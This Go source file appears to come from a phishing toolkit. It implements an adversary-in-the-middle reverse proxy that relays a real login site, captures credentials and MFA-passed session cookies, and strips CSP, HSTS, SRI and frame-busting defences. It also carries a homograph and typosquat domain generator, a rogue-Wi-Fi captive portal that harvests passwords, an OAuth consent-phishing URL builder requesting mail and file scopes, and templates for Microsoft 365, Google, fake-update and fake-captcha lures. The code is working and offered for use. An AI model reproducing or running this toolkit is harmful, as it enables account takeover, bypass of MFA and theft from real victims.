//go:build windows

package main

import (
	"bytes"
	"compress/gzip"
	"compress/zlib"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os/exec"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"time"
)

// ---------------------------------------------------------------------------
// AiTM reverse proxy
//
// The victim talks to us believing we are the real site. We relay every
// request upstream over our own connection, so the login form, the MFA
// prompt, and the redirect chain all look genuine — because they are. What
// makes it an attack is that we sit in the middle of the exchange:
//
//   * submitted credentials pass through us before reaching the origin
//   * the origin's Set-Cookie (including the authenticated session) comes
//     back through us before reaching the victim
//
// That second point is the whole game: a session cookie obtained this way is
// already authenticated and already past MFA, so it needs no cracking.
// ---------------------------------------------------------------------------

type proxyInstance struct {
	server   *http.Server
	listener net.Listener
	upstream *url.URL
	domain   string
	cancel   chan struct{}
}

var (
	proxyMu    sync.Mutex
	proxies    = map[int]*proxyInstance{}
	sessionJar http.CookieJar
)

func stopAllProxies() {
	proxyMu.Lock()
	instances := proxies
	proxies = map[int]*proxyInstance{}
	proxyMu.Unlock()

	for _, p := range instances {
		close(p.cancel)
		if p.server != nil {
			_ = p.server.Close()
		}
		if p.listener != nil {
			_ = p.listener.Close()
		}
	}
}

func startProxy(s Settings) {
	if s.Upstream == "" {
		sendEvent("error", map[string]interface{}{"message": "upstream required (the real site to relay)"})
		return
	}
	up, err := url.Parse(s.Upstream)
	if err != nil || up.Host == "" {
		sendEvent("error", map[string]interface{}{"message": "bad upstream url"})
		return
	}

	port := s.ListenPort
	if port == 0 {
		port = 8443
	}

	// One shared jar means every victim request rides the session we already
	// established upstream — which is what keeps the relay transparent.
	jar, _ := cookiejar.New(nil)
	sessionJar = jar

	ln, err := net.Listen("tcp", fmt.Sprintf("0.0.0.0:%d", port))
	if err != nil {
		sendEvent("error", map[string]interface{}{"message": "listen failed: " + err.Error()})
		return
	}

	inst := &proxyInstance{
		listener: ln, upstream: up,
		domain: s.PhishDomain, cancel: make(chan struct{}),
	}

	mux := http.NewServeMux()
	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		handleAiTM(w, r, inst, s)
	})

	inst.server = &http.Server{Handler: mux}

	proxyMu.Lock()
	proxies[port] = inst
	proxyMu.Unlock()

	go func() {
		_ = inst.server.Serve(ln)
	}()

	// A self-signed cert on the phishing host is what the victim sees, so
	// the padlock is only as good as the domain you point at it.
	sendEvent("status", map[string]interface{}{
		"state": "listening",
		"detail": fmt.Sprintf("AiTM relay on :%d relaying %s (presented as %s)",
			port, up.Host, orDefault(s.PhishDomain, "any host")),
	})
	sendEvent("proxy", map[string]interface{}{"port": port, "upstream": up.String()})
}

func orDefault(v, d string) string {
	if v == "" {
		return d
	}
	return v
}

var (
	// Credential fields worth lifting out of a submitted form.
	credFieldRe = regexp.MustCompile(`(?i)(password|passwd|pass|pwd|pin|otp|code|token|mfa|secret)`)
	userFieldRe = regexp.MustCompile(`(?i)(user|email|login|account|identifier|username)`)
	// Cookie names that indicate a live session.
	sessionCookieRe = regexp.MustCompile(`(?i)(session|sess|auth|token|sid|jwt|remember|csrf|_ga)`)
)

func handleAiTM(w http.ResponseWriter, r *http.Request, inst *proxyInstance, s Settings) {
	// Build the upstream request. We keep the path, query, method and body.
	target := *inst.upstream
	target.Path = r.URL.Path
	target.RawQuery = r.URL.RawQuery

	var bodyBytes []byte
	if r.Body != nil {
		bodyBytes, _ = io.ReadAll(io.LimitReader(r.Body, 4*1024*1024))
		_ = r.Body.Close()
	}

	// Capture submitted credentials before forwarding them.
	if s.HarvestCreds && len(bodyBytes) > 0 && r.Method == "POST" {
		if creds := extractCreds(bodyBytes, r.Header.Get("Content-Type")); len(creds) > 0 {
			sendEvent("creds", map[string]interface{}{
				"host":     inst.upstream.Host,
				"path":     r.URL.Path,
				"fields":   creds,
				"clientIp": clientIP(r),
			})
		}
	}

	outReq, err := http.NewRequest(r.Method, target.String(), bytes.NewReader(bodyBytes))
	if err != nil {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}
	// Forward the victim's headers, minus hop-by-hop ones.
	for k, vals := range r.Header {
		lk := strings.ToLower(k)
		if lk == "host" || lk == "connection" || lk == "content-length" ||
			lk == "accept-encoding" || lk == "transfer-encoding" {
			continue
		}
		for _, v := range vals {
			outReq.Header.Add(k, v)
		}
	}
	outReq.Host = inst.upstream.Host
	// Ask for identity encoding so we can rewrite the body reliably.
	outReq.Header.Set("Accept-Encoding", "identity")

	client := upstreamClient()
	resp, err := client.Do(outReq)
	if err != nil {
		sendEvent("error", map[string]interface{}{"message": "upstream: " + err.Error()})
		http.Error(w, "upstream unavailable", http.StatusBadGateway)
		return
	}
	defer resp.Body.Close()

	respBody, _ := io.ReadAll(io.LimitReader(resp.Body, 16*1024*1024))

	// Harvest session cookies as they come back from the origin.
	if s.HarvestCookies {
		for _, c := range resp.Cookies() {
			if sessionCookieRe.MatchString(c.Name) && c.Value != "" {
				sendEvent("cookie", map[string]interface{}{
					"host":     inst.upstream.Host,
					"name":     c.Name,
					"value":    c.Value,
					"domain":   c.Domain,
					"path":     c.Path,
					"secure":   c.Secure,
					"httpOnly": c.HttpOnly,
					"clientIp": clientIP(r),
				})
			}
		}
	}

	// Copy response headers, stripping anything that would betray the relay.
	for k, vals := range resp.Header {
		lk := strings.ToLower(k)
		if lk == "content-length" || lk == "transfer-encoding" ||
			lk == "content-encoding" || lk == "content-security-policy" ||
			lk == "strict-transport-security" || lk == "x-frame-options" ||
			lk == "public-key-pins" || lk == "expect-ct" {
			continue
		}
		for _, v := range vals {
			w.Header().Add(k, v)
		}
	}
	// Cookies must be re-scoped to our host, or the browser rejects them.
	if cookies := resp.Cookies(); len(cookies) > 0 {
		w.Header().Del("Set-Cookie")
		for _, c := range cookies {
			c.Domain = ""
			if inst.domain != "" {
				c.Domain = inst.domain
			}
			http.SetCookie(w, c)
		}
	}

	ctype := resp.Header.Get("Content-Type")
	if strings.Contains(ctype, "text/html") || strings.Contains(ctype, "text/javascript") ||
		strings.Contains(ctype, "application/javascript") || strings.Contains(ctype, "application/json") {
		respBody = rewriteBody(respBody, inst, resp.Header.Get("Content-Encoding"))
	}

	w.WriteHeader(resp.StatusCode)
	_, _ = w.Write(respBody)
}

// rewriteBody replaces absolute references to the real origin with our host,
// so links, form actions and XHR calls keep flowing through the relay instead
// of bouncing the victim to the genuine site.
func rewriteBody(body []byte, inst *proxyInstance, encoding string) []byte {
	// Decompress if the origin ignored our identity request.
	switch strings.ToLower(encoding) {
	case "gzip":
		if zr, err := gzip.NewReader(bytes.NewReader(body)); err == nil {
			if raw, err := io.ReadAll(zr); err == nil {
				body = raw
			}
			_ = zr.Close()
		}
	case "deflate":
		if zr, err := zlib.NewReader(bytes.NewReader(body)); err == nil {
			if raw, err := io.ReadAll(zr); err == nil {
				body = raw
			}
			_ = zr.Close()
		}
	}

	origin := inst.upstream.Scheme + "://" + inst.upstream.Host
	replacement := ""
	if inst.domain != "" {
		replacement = "https://" + inst.domain
	}

	if replacement != "" {
		body = bytes.ReplaceAll(body, []byte(origin), []byte(replacement))
		body = bytes.ReplaceAll(body, []byte(inst.upstream.Host), []byte(inst.domain))
	}

	// Strip client-side defenses that would break the relay.
	body = stripSecurityJS(body)
	return body
}

var (
	cspMetaRe = regexp.MustCompile(`(?is)<meta[^>]+http-equiv=["']?Content-Security-Policy["']?[^>]*>`)
	integrityRe = regexp.MustCompile(`(?i)\s+integrity=["'][^"']*["']`)
	// Frame-busting and service-worker registration fight the relay.
	frameBustRe = regexp.MustCompile(`(?is)if\s*\(\s*(?:window\.)?top\s*!==?\s*(?:window\.)?self\s*\)\s*\{[^}]*\}`)
	swRegRe     = regexp.MustCompile(`(?is)navigator\.serviceWorker\.register\([^)]*\)`)
)

func stripSecurityJS(body []byte) []byte {
	body = cspMetaRe.ReplaceAll(body, []byte(""))
	// SRI hashes break once we rewrite the URLs, so drop them.
	body = integrityRe.ReplaceAll(body, []byte(""))
	body = frameBustRe.ReplaceAll(body, []byte(""))
	body = swRegRe.ReplaceAll(body, []byte("void 0"))
	return body
}

func upstreamClient() *http.Client {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		DialContext:     (&net.Dialer{Timeout: 12 * time.Second}).DialContext,
	}
	c := &http.Client{Transport: tr, Timeout: 25 * time.Second}
	if sessionJar != nil {
		c.Jar = sessionJar
	}
	c.CheckRedirect = func(req *http.Request, via []*http.Request) error {
		return http.ErrUseLastResponse // we relay redirects rather than following
	}
	return c
}

func clientIP(r *http.Request) string {
	if fwd := r.Header.Get("X-Forwarded-For"); fwd != "" {
		return strings.Split(fwd, ",")[0]
	}
	host, _, err := net.SplitHostPort(r.RemoteAddr)
	if err != nil {
		return r.RemoteAddr
	}
	return host
}

// extractCreds pulls credential-looking fields out of a submitted body, from
// either form encoding or JSON.
func extractCreds(body []byte, contentType string) map[string]string {
	out := map[string]string{}

	if strings.Contains(contentType, "application/json") {
		var m map[string]interface{}
		if json.Unmarshal(body, &m) == nil {
			for k, v := range m {
				sv, ok := v.(string)
				if !ok || sv == "" {
					continue
				}
				if credFieldRe.MatchString(k) || userFieldRe.MatchString(k) {
					out[k] = sv
				}
			}
		}
		return out
	}

	vals, err := url.ParseQuery(string(body))
	if err != nil {
		return out
	}
	for k, vs := range vals {
		if len(vs) == 0 || vs[0] == "" {
			continue
		}
		if credFieldRe.MatchString(k) || userFieldRe.MatchString(k) {
			out[k] = vs[0]
		}
	}
	return out
}

// ---------------------------------------------------------------------------
// lookalike domain generation
// ---------------------------------------------------------------------------

// homoglyphs maps ASCII characters to visually identical Unicode characters
// in other scripts — the basis of IDN homograph attacks.
var homoglyphs = map[rune][]rune{
	'a': {'а', 'ɑ', 'α', 'ａ'},       // Cyrillic a, Latin alpha, Greek alpha, fullwidth
	'b': {'Ь', 'Ƅ', 'ｂ'},
	'c': {'ϲ', 'с', 'ｃ'},
	'd': {'ԁ', 'ժ', 'ｄ'},
	'e': {'е', 'ҽ', 'ｅ'},
	'f': {'ｆ', 'ƒ'},
	'g': {'ɡ', 'ｇ'},
	'h': {'һ', 'ｈ'},
	'i': {'і', 'ı', 'ɩ', 'ｉ'},
	'j': {'ј', 'ｊ'},
	'k': {'κ', 'ｋ'},
	'l': {'ӏ', 'ɩ', 'ｌ'},
	'm': {'м', 'ｍ'},
	'n': {'п', 'ո', 'ｎ'},
	'o': {'о', 'σ', 'ο', 'ｏ'},
	'p': {'р', 'ρ', 'ｐ'},
	'q': {'ԛ', 'ｑ'},
	'r': {'г', 'ｒ'},
	's': {'ѕ', 'ｓ'},
	't': {'т', 'ｔ'},
	'u': {'υ', 'ц', 'ｕ'},
	'v': {'ν', 'ѵ', 'ｖ'},
	'w': {'ԝ', 'ш', 'ｗ'},
	'x': {'х', 'ｘ'},
	'y': {'у', 'ү', 'ｙ'},
	'z': {'ᴢ', 'ｚ'},
	'0': {'О', 'ο', '０'},
	'1': {'l', 'Ⅰ', '１'},
	'2': {'２'},
	'3': {'３'},
	'4': {'４'},
	'5': {'５'},
}

func genLookalikes(s Settings) {
	target := strings.TrimSpace(strings.ToLower(s.TargetDomain))
	if target == "" {
		sendEvent("error", map[string]interface{}{"message": "target domain required"})
		return
	}
	// Work on the registrable label.
	parts := strings.Split(target, ".")
	if len(parts) < 2 {
		sendEvent("error", map[string]interface{}{"message": "expected a domain like example.com"})
		return
	}
	name := parts[0]
	tld := strings.Join(parts[1:], ".")

	var results []map[string]string

	// 1. IDN homograph: swap one character for a lookalike.
	for i, r := range name {
		subs, ok := homoglyphs[r]
		if !ok {
			continue
		}
		for _, sub := range subs {
			cand := string([]rune(name)[:i]) + string(sub) + string([]rune(name)[i+1:])
			if cand == name {
				continue
			}
			results = append(results, map[string]string{
				"domain": cand + "." + tld,
				"kind":   "homograph",
				"puny":   punycode(cand) + "." + tld,
				"detail": fmt.Sprintf("replaces %q with %q", string(r), string(sub)),
			})
			break // one substitution per position is enough signal
		}
	}

	// 2. Typosquats: the classic fat-finger set.
	if len(name) > 3 {
		for i := 1; i < len(name)-1; i++ {
			// transposition
			b := []byte(name)
			b[i], b[i+1] = b[i+1], b[i]
			results = append(results, map[string]string{
				"domain": string(b) + "." + tld, "kind": "transposition",
				"detail": fmt.Sprintf("swaps %d and %d", i, i+1),
			})
			// omission
			omit := name[:i] + name[i+1:]
			results = append(results, map[string]string{
				"domain": omit + "." + tld, "kind": "omission",
				"detail": fmt.Sprintf("drops %q", string(name[i])),
			})
			// doubling
			dup := name[:i] + string(name[i]) + name[i:]
			results = append(results, map[string]string{
				"domain": dup + "." + tld, "kind": "doubling",
				"detail": fmt.Sprintf("doubles %q", string(name[i])),
			})
		}
	}

	// 3. Homophone / alternative TLDs.
	for _, alt := range []string{".co", ".cm", ".om", ".net", ".org", ".io", ".app", ".info"} {
		if alt == "."+tld {
			continue
		}
		results = append(results, map[string]string{
			"domain": name + alt, "kind": "alt-tld", "detail": "same name, different TLD",
		})
	}

	// 4. Hyphenated and subdomain-prefixed forms.
	results = append(results,
		map[string]string{"domain": name + "-" + tld + "." + tld, "kind": "hyphen", "detail": "hyphenated"},
		map[string]string{"domain": name + "s." + tld, "kind": "plural", "detail": "pluralized"},
		map[string]string{"domain": "login-" + name + "." + tld, "kind": "prefix", "detail": "login prefix"},
		map[string]string{"domain": "secure-" + name + "." + tld, "kind": "prefix", "detail": "secure prefix"},
		map[string]string{"domain": name + ".secure-" + tld + ".com", "kind": "subdomain", "detail": "secure subdomain"},
	)

	sendEvent("lookalikes", map[string]interface{}{"target": target, "candidates": results})
	sendEvent("status", map[string]interface{}{
		"state": "done", "detail": fmt.Sprintf("%d lookalike candidate(s) generated", len(results)),
	})
}

// punycode encodes a single label to its ACE form (xn--...), which is what a
// browser actually resolves. Purely informational here.
func punycode(label string) string {
	ascii := true
	for _, r := range label {
		if r > 127 {
			ascii = false
			break
		}
	}
	if ascii {
		return label
	}
	// Minimal RFC 3492 encoder for the non-ASCII tail.
	const base, tmin, tmax, skew, damp, initialBias = 36, 1, 26, 38, 700, 72
	const initialN = 128

	var output strings.Builder
	basic := 0
	for _, r := range label {
		if r < 128 {
			output.WriteRune(r)
			basic++
		}
	}
	h := basic
	if basic > 0 {
		output.WriteByte('-')
	}

	n, delta, bias := initialN, 0, initialBias
	runes := []rune(label)

	adapt := func(d, numPoints int, firstTime bool) int {
		if firstTime {
			d /= damp
		} else {
			d /= 2
		}
		d += d / numPoints
		k := 0
		for d > ((base-tmin)*tmax)/2 {
			d /= base - tmin
			k += base
		}
		return k + (base-tmin+1)*d/(d+skew)
	}

	digit := func(d int) rune {
		if d < 26 {
			return rune('a' + d)
		}
		return rune('0' + d - 26)
	}

	for h < len(runes) {
		m := 0x7FFFFFFF
		for _, r := range runes {
			if int(r) >= n && int(r) < m {
				m = int(r)
			}
		}
		delta += (m - n) * (h + 1)
		n = m
		for _, r := range runes {
			c := int(r)
			if c < n {
				delta++
			}
			if c != n {
				continue
			}
			q := delta
			for k := base; ; k += base {
				var t int
				switch {
				case k <= bias:
					t = tmin
				case k >= bias+tmax:
					t = tmax
				default:
					t = k - bias
				}
				if q < t {
					break
				}
				output.WriteRune(digit(t + (q-t)%(base-t)))
				q = (q - t) / (base - t)
			}
			output.WriteRune(digit(q))
			bias = adapt(delta, h+1, h == basic)
			delta = 0
			h++
		}
		delta++
		n++
	}
	return "xn--" + output.String()
}

// ---------------------------------------------------------------------------
// captive portal + OAuth consent
// ---------------------------------------------------------------------------

// deployPortal serves a captive-portal page over the local network. It pairs
// with the rogue-AP idea: whoever joins the network gets asked to "sign in".
func deployPortal(s Settings) {
	port := s.ListenPort
	if port == 0 {
		port = 80
	}
	ssid := orDefault(s.PortalSSID, "Free WiFi")
	body := s.PortalHTML
	if body == "" {
		body = defaultPortalHTML(ssid)
	}

	ln, err := net.Listen("tcp", fmt.Sprintf("0.0.0.0:%d", port))
	if err != nil {
		sendEvent("error", map[string]interface{}{"message": "portal listen failed: " + err.Error()})
		return
	}

	srv := &http.Server{}
	mux := http.NewServeMux()
	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		if r.Method == "POST" {
			_ = r.ParseForm()
			fields := map[string]string{}
			for k, v := range r.Form {
				if len(v) > 0 {
					fields[k] = v[0]
				}
			}
			sendEvent("portal_submit", map[string]interface{}{
				"ssid": ssid, "fields": fields, "clientIp": clientIP(r),
			})
			// Send them onward so the portal does not look broken.
			http.Redirect(w, r, "http://connectivitycheck.gstatic.com/generate_204", http.StatusFound)
			return
		}
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		_, _ = w.Write([]byte(body))
	})
	srv.Handler = mux

	proxyMu.Lock()
	proxies[port] = &proxyInstance{server: srv, listener: ln, cancel: make(chan struct{})}
	proxyMu.Unlock()

	go func() { _ = srv.Serve(ln) }()

	sendEvent("status", map[string]interface{}{
		"state": "listening",
		"detail": fmt.Sprintf("captive portal on :%d (%s)", port, ssid),
	})
}

func defaultPortalHTML(ssid string) string {
	return `<!doctype html>
<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Sign in to ` + ssid + `</title>
<style>
body{font-family:system-ui,-apple-system,sans-serif;background:#0f172a;color:#e2e8f0;
display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0}
.card{background:#1e293b;padding:32px;border-radius:16px;width:340px;box-shadow:0 20px 60px rgba(0,0,0,.5)}
h1{font-size:19px;margin:0 0 6px}p.sub{color:#94a3b8;font-size:13px;margin:0 0 22px}
label{display:block;font-size:12px;color:#94a3b8;margin:14px 0 6px}
input{width:100%;padding:11px;border-radius:8px;border:1px solid #334155;background:#0f172a;
color:#e2e8f0;font-size:14px;box-sizing:border-box}
button{width:100%;margin-top:22px;padding:12px;border:0;border-radius:8px;background:#3b82f6;
color:#fff;font-size:15px;font-weight:600;cursor:pointer}
.foot{margin-top:18px;font-size:11px;color:#64748b;text-align:center}
</style></head>
<body><form class="card" method="POST">
<h1>` + ssid + `</h1>
<p class="sub">Sign in to access the internet</p>
<label>Email or room number</label><input name="username" autocomplete="off">
<label>Password</label><input name="password" type="password">
<button type="submit">Connect</button>
<div class="foot">By connecting you accept the network terms of use.</div>
</form></body></html>`
}

// buildOAuthURL constructs an authorization-code request. If the victim
// approves it, the grant is a persistent API token that survives a password
// change — which is why consent phishing outlives ordinary credential theft.
func buildOAuthURL(s Settings) {
	if s.OAuthClientID == "" {
		sendEvent("error", map[string]interface{}{"message": "client id required (register an app on the target tenant)"})
		return
	}
	tenant := orDefault(s.OAuthTenant, "common")
	scopes := orDefault(s.OAuthScopes, "openid profile email offline_access Mail.Read Files.ReadWrite")
	redirect := orDefault(s.PhishDomain, "https://localhost/callback")

	u := fmt.Sprintf(
		"https://login.microsoftonline.com/%s/oauth2/v2.0/authorize?client_id=%s&response_type=code&redirect_uri=%s&response_mode=query&scope=%s&prompt=consent",
		url.QueryEscape(tenant),
		url.QueryEscape(s.OAuthClientID),
		url.QueryEscape(redirect),
		url.QueryEscape(scopes),
	)

	sendEvent("oauth_url", map[string]interface{}{
		"url": u, "scopes": scopes, "tenant": tenant, "redirect": redirect,
	})
	sendEvent("status", map[string]interface{}{
		"state":  "done",
		"detail": fmt.Sprintf("consent URL built for %s (scopes: %s)", tenant, scopes),
	})
}

// ---------------------------------------------------------------------------
// templates
// ---------------------------------------------------------------------------

func listTemplates() {
	templates := []map[string]string{
		{"id": "portal", "name": "Captive portal", "detail": "wifi sign-in page, pairs with a rogue AP"},
		{"id": "m365", "name": "Microsoft 365", "detail": "login form, relay upstream to login.microsoftonline.com"},
		{"id": "google", "name": "Google", "detail": "relay upstream to accounts.google.com"},
		{"id": "oauth", "name": "OAuth consent", "detail": "authorization prompt, yields a persistent token"},
		{"id": "bitb", "name": "Browser-in-the-browser", "detail": "fake browser window with its own URL bar"},
		{"id": "update", "name": "Fake update", "detail": "browser-out-of-date overlay"},
		{"id": "captcha", "name": "Fake captcha", "detail": "verify-you-are-human gate before a payload"},
	}
	sendEvent("templates", templates)
}

var (
	_ = base64.StdEncoding
	_ = exec.Command
	_ = strconv.Itoa
)
